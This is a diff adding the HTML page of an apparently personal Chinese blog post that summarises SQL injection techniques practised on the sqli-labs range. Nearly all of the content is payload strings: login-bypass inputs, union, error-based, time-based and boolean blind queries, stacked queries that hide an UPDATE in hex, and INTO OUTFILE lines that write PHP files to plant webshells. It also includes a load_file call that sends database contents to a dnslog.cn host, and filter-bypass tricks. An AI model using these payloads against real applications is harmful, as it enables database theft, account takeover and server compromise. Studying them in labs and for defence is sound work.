@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Sql注入 | Reus09&#39;s Blog</title>
+<meta name="keywords" content="sql注入">
+<meta name="description" content="这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。 [TOC] 万能密码 1 2 3 4 5 6 7 8 9 admin&#39; -- admin&#39; # admin&#39;/\* &#39; or 1=1-- &#39; or 1=1# &#39; or">
+<meta name="author" content="Reus09">
+<link rel="canonical" href="http://www.reus09.top/posts/tech/sql%E6%B3%A8%E5%85%A5/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Sql注入" />
+<meta property="og:description" content="这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。 [TOC] 万能密码 1 2 3 4 5 6 7 8 9 admin&#39; -- admin&#39; # admin&#39;/\* &#39; or 1=1-- &#39; or 1=1# &#39; or" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.reus09.top/posts/tech/sql%E6%B3%A8%E5%85%A5/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-16T19:45:34+08:00" />
+<meta property="article:modified_time" content="2022-09-16T19:45:34+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Sql注入"/>
+<meta name="twitter:description" content="这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。 [TOC] 万能密码 1 2 3 4 5 6 7 8 9 admin&#39; -- admin&#39; # admin&#39;/\* &#39; or 1=1-- &#39; or 1=1# &#39; or"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "📚文章",
+      "item": "http://www.reus09.top/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "👨🏻‍💻技术",
+      "item": "http://www.reus09.top/posts/tech/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "Sql注入",
+      "item": "http://www.reus09.top/posts/tech/sql%E6%B3%A8%E5%85%A5/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Sql注入",
+  "name": "Sql注入",
+  "description": "这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。 [TOC] 万能密码 1 2 3 4 5 6 7 8 9 admin\u0026#39; -- admin\u0026#39; # admin\u0026#39;/\\* \u0026#39; or 1=1-- \u0026#39; or 1=1# \u0026#39; or",
+  "keywords": [
+    "sql注入"
+  ],
+  "articleBody": "这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。\n[TOC]\n万能密码 1 2 3 4 5 6 7 8 9 admin' -- admin' # admin'/\\* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- 1'^1# (False注入) 常见的是对 ’ , \" , ),还有一些内置函数的绕过 联合查询 查库名-\u003e查表名-\u003e查列名（字段名）-\u003e查值（数据）\n根据字段数量查：order by 4 --+\n根据页面回显数据字段位置:union select 1,2,3,4,x... --+\n爆数据库：\n1 2 3 4 5 select database() select schema_name from information_schema.schemata; -- MySQL8新特性(\u003e8.0.21) table information_schema.TABLESPACES_EXTENSIONS 根据上面得到的数据库进行爆对应的表:\n1 union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database() union查询:\n1 2 3 4 5 UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* 列出所有用户自定义数据库中的表 */ -- MySQL 4版本时用version=9，MySQL 5版本时用version=10 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* 列出当前数据库中的表 */ SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql'; 盲注:\n1 2 3 4 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables \u003e 'A' -- MySQL8新特性 and (table information_schema.TABLESPACES_EXTENSIONS limit 1,1)\u003e(BINARY('a'),'0')# 主要是通过布尔盲注，一个个试，比较废时间,可以通过编写脚本 时间盲注，根据时间判断成功与否也可以 报错：\n1 2 AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1))); -- 在5.1.5版本中成功。 主要是利用floor函数的溢出问题， 通过contractxml函数等进行报错也可以实现contract(0x7e,database()) 根据对应的表获取对应的列名：\n1 Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name) /*此处的表名为字符串型，也通过十六进制表示*/ union查询\n1 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename' 盲注\n1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns \u003e 'A' 报错\n1 2 3 4 -- 在5.1.5版本中成功 AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1) -- MySQL 5.1版本修复了 AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELE 值查询\n1 2 3 4 Union select 1,2,column_name,4,xxx from (database_name.)table_name -- MySQL8新特性 and (table flag limit 1,1)\u003e(BINARY('a'))# 盲注 基于报错盲注 通过特殊函数的错误使用使其参数被页面输出。\n前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。\n比如(sqli.error()) 常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等。\n1 2 3 4 5 6 (where|and|or) exp(~(select * from(select user())a)); (where|and|or) pow(~(select * from(select user())a),9999); (where|and|or) updatexml(1,concat(0x7e,(select user()),0x7e),1); (where|and|or) extractvalue(1,concat(0x7e,(select user()),0x7e)); (where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2))); (where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,ceil(rand(0)*2))); 基于时间盲注 依赖于通过页面返回的延迟时间来判断条件是否正确。\n通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 -- sleep() (where | and) if(substr((select password from users where username='admin'),1,1)='a',sleep(3),1) select * from users where username=$username (and | or) if(length(database())\u003e8,sleep(3),1) -- benchmark() or benchmark(5000000,md5('test')) or if(length(database())\u003e5,benchmark(1500000,md5('test')),1) -- pg_sleep() (and | or) (case when (select substr(password,1,1) from users)='a' then pg_sleep(5) else pg_sleep(0) end) and (select case when(substr((select password from users where username='admin'),1,1)='a') then (select 'roarctf' from pg_sleep(3)) else '1' end)='roarctf' -- 笛卡尔积 heavy query select * from users where id=1 and 1\u003e(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C); select * from users where id=1 and if(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1'; 基于布尔盲注 使用场景：对真/假条件返回的内容很容易区分。\n1 2 3 4 5 6 7 (where | and) if(substr((select password from users where username='admin'),1,1)='a',1,0) select * from users where username=nouser or length(database())\u003e8 select * from users where username=nouser or ascii(substr(database(),1,1))\u003c130 -- 通配符 select * from users where username='xxx' and passwd='-1' or passwd like '{}%'# 基于sql增删改查的盲注 update注入 1 2 3 4 5 #盲注 update users set username = '0'|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15; update users set username = '0' | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14; insert注入 1 2 3 4 #盲注 insert into users values (16,'K0rz3n','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1)); insert into users values (15,'K0rz3n','0'| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d)); order by 注入 1 2 3 4 5 #报错注入 select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1); #盲注 select * from users order by id ^(select(select version()) regexp '^5'); Group by 注入 1 2 #盲注 select * from users group by 1 having substr((select database()),1,1)='c' 文件写入 我们可以通过sql语句实现写入webshell，从而可以远程通过菜刀、冰蝎等工具建立连接。 当然，文件写入的条件比较特殊 数据库当前用户为root权限； 知道当前网站的绝对路径； PHP的GPC为 off状态；(魔术引号，GET，POST，Cookie) 写入的那个路径存在写入权限。 基于联合查询 1 2 3 SELECT 1,'\u003c?php phpinfo();?\u003e',3 into outfile 'C:\\info.php'%23 ?id=1 UNION ALL SELECT 1,'\u003c?php phpinfo();?\u003e',3 into dumpfile 'C:\\info.php'%23 非联合查询 当我们无法使用联合查询时，我们可以使用fields terminated by与lines terminated by来写shell：?id=1 into outfile 'C:\\info.php' FIELDS TERMINATED BY '\u003c?php phpinfo();?\u003e'%23\n宽字节注入 国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠 \\ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \\，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。\nGET方式：利用URLencode ?id=1%df'||1={payload}%23\nPOST方式：利用UTF-16或UTF-32或中文 ?id=1我'||1={payload}#\n堆叠注入 由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 1;show databases;# 1;show tables;# 1;show columns from [表名];# 1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e) /*预处理*/ 1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;# 1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;# 1';SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;# 1';SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;# 二次注入 攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。\n1 2 3 4 5 现在通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode()或者 rawurldecode()函数，则会导致二次解码生成单引号二引发注入，即二次注入。 Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。 addslashes函数虽然在过滤之后会添加 “\\” 进行转义，但是 “\\” 并不会被带到数据库中 二次urldecode注入 单引号：%25%27\n双引号：%25%22\nDNS_log注入 原理 通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。 DNSLOG的使用场景 在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。 对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。 所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。 DNS_log函数解析: 读取文件并返回文件内容为字符串。 要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。 以sql-labs Less-8为例子：\n可以输入以下payload:http://172.16.11.54/sqli-labs/Less-8/?id=1' and load_file(concat(\"\\\\\\\\\",database(),\".uifm3e.dnslog.cn\\\\xxx.txt\"))--+\n绕过 空格 多层括号嵌套 改用+号 使用注释代替（/注释内容/、/! MYSQL专属/） and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略 %09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格 单双引号 需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。 不需要跳出单引号的情况：字符串可用16进制表示、也可通过进制转换函数表示成其他进制。 1 2 3 4 -- hex 编码 SELECT * FROM Users WHERE username = 0x61646D696E -- char() 函数 SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) 逗号 采用 substr((database())from({})for(1)) 的形式 采用join：union select * from ((select 1)a join (select 2)b join (select 3)c); 等号 like 用regexp或者in \u003c\u003e and / or 双写anandd、oorr 使用运算符代替\u0026\u0026、|| 直接拼接=号，如：?id=1=(condition) 其他方法，如：?id=1^(condition)、?id=1)xor(condition) union 盲注：'and(select pass from users limit 1)='secret ",
+  "wordCount" : "3172",
+  "inLanguage": "en",
+  "datePublished": "2022-09-16T19:45:34+08:00",
+  "dateModified": "2022-09-16T19:45:34+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "Reus09"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://www.reus09.top/posts/tech/sql%E6%B3%A8%E5%85%A5/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Reus09's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://www.reus09.top" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://www.reus09.top/search" title="🔍搜索 (Alt &#43; /)" accesskey=/>
+                    <span>🔍搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://www.reus09.top/" title="🏠主页">
+                    <span>🏠主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://www.reus09.top/posts" title="📚文章">
+                    <span>📚文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://www.reus09.top/archives/" title="⏱时间轴">
+                    <span>⏱时间轴</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://www.reus09.top/tags" title="🔖标签">
+                    <span>🔖标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://www.reus09.top/about" title="🙋🏻‍♂️关于">
+                    <span>🙋🏻‍♂️关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://www.reus09.top/links" title="🤝友链">
+                    <span>🤝友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://www.reus09.top">Home</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/">📚文章</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/tech/">👨🏻‍💻技术</a></div>
+    <h1 class="post-title">
+      Sql注入
+    </h1>
+    <div class="post-meta"><span title='2022-09-16 19:45:34 +0800 +0800'>2022-09-16</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Reus09
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e4%b8%87%e8%83%bd%e5%af%86%e7%a0%81" aria-label="万能密码">万能密码</a></li>
+                    <li>
+                        <a href="#%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2" aria-label="联合查询">联合查询</a></li>
+                    <li>
+                        <a href="#%e7%9b%b2%e6%b3%a8" aria-label="盲注">盲注</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%9f%ba%e4%ba%8e%e6%8a%a5%e9%94%99%e7%9b%b2%e6%b3%a8" aria-label="基于报错盲注">基于报错盲注</a></li>
+                    <li>
+                        <a href="#%e5%9f%ba%e4%ba%8e%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" aria-label="基于时间盲注">基于时间盲注</a></li>
+                    <li>
+                        <a href="#%e5%9f%ba%e4%ba%8e%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8" aria-label="基于布尔盲注">基于布尔盲注</a></li>
+                    <li>
+                        <a href="#%e5%9f%ba%e4%ba%8esql%e5%a2%9e%e5%88%a0%e6%94%b9%e6%9f%a5%e7%9a%84%e7%9b%b2%e6%b3%a8" aria-label="基于sql增删改查的盲注">基于sql增删改查的盲注</a><ul>
+                            
+                    <li>
+                        <a href="#update%e6%b3%a8%e5%85%a5" aria-label="update注入">update注入</a></li>
+                    <li>
+                        <a href="#insert%e6%b3%a8%e5%85%a5" aria-label="insert注入">insert注入</a></li>
+                    <li>
+                        <a href="#order-by-%e6%b3%a8%e5%85%a5" aria-label="order by 注入">order by 注入</a></li>
+                    <li>
+                        <a href="#group-by-%e6%b3%a8%e5%85%a5" aria-label="Group by 注入">Group by 注入</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5" aria-label="文件写入">文件写入</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%9f%ba%e4%ba%8e%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2" aria-label="基于联合查询">基于联合查询</a></li>
+                    <li>
+                        <a href="#%e9%9d%9e%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2" aria-label="非联合查询">非联合查询</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%ae%bd%e5%ad%97%e8%8a%82%e6%b3%a8%e5%85%a5" aria-label="宽字节注入">宽字节注入</a></li>
+                    <li>
+                        <a href="#%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5" aria-label="堆叠注入">堆叠注入</a></li>
+                    <li>
+                        <a href="#%e4%ba%8c%e6%ac%a1%e6%b3%a8%e5%85%a5" aria-label="二次注入">二次注入</a><ul>
+                            <ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#%e4%ba%8c%e6%ac%a1urldecode%e6%b3%a8%e5%85%a5" aria-label="二次urldecode注入">二次urldecode注入</a></li></ul>
+                        </ul>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#dns_log%e6%b3%a8%e5%85%a5" aria-label="DNS_log注入">DNS_log注入</a></li>
+                    <li>
+                        <a href="#%e7%bb%95%e8%bf%87" aria-label="绕过">绕过</a><ul>
+                            
+                    <li>
+                        <a href="#%e7%a9%ba%e6%a0%bc" aria-label="空格">空格</a></li>
+                    <li>
+                        <a href="#%e5%8d%95%e5%8f%8c%e5%bc%95%e5%8f%b7" aria-label="单双引号">单双引号</a></li>
+                    <li>
+                        <a href="#%e9%80%97%e5%8f%b7" aria-label="逗号">逗号</a></li>
+                    <li>
+                        <a href="#%e7%ad%89%e5%8f%b7" aria-label="等号">等号</a></li>
+                    <li>
+                        <a href="#and--or" aria-label="and / or">and / or</a></li>
+                    <li>
+                        <a href="#union" aria-label="union">union</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+         
+         activeElement = elements[0];
+         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+     }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+             const id = encodeURI(element.getAttribute('id')).toLowerCase();
+             if (element === activeElement){
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+             } else {
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+             }
+         })
+     }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+</script>
+
+  <div class="post-content"><p>这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。</p>
+<p>[TOC]</p>
+<h2 id="万能密码">万能密码<a hidden class="anchor" aria-hidden="true" href="#万能密码">#</a></h2>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>admin&#39; --
+</span></span><span style="display:flex;"><span>admin&#39; #
+</span></span><span style="display:flex;"><span>admin&#39;/\*
+</span></span><span style="display:flex;"><span>&#39; or 1=1--
+</span></span><span style="display:flex;"><span>&#39; or 1=1#
+</span></span><span style="display:flex;"><span>&#39; or 1=1/*
+</span></span><span style="display:flex;"><span>&#39;) or &#39;1&#39;=&#39;1--
+</span></span><span style="display:flex;"><span>&#39;) or (&#39;1&#39;=&#39;1-- 
+</span></span><span style="display:flex;"><span>1&#39;^1#       (False注入)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>常见的是对 &rsquo; , &quot; , ),还有一些内置函数的绕过</li>
+</ul>
+<h2 id="联合查询">联合查询<a hidden class="anchor" aria-hidden="true" href="#联合查询">#</a></h2>
+<p><strong>查库名-&gt;查表名-&gt;查列名（字段名）-&gt;查值（数据）</strong></p>
+<ul>
+<li>
+<p>根据字段数量查：<code>order by 4 --+</code></p>
+</li>
+<li>
+<p>根据页面回显数据字段位置:<code>union select 1,2,3,4,x... --+</code></p>
+</li>
+<li>
+<p>爆数据库：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
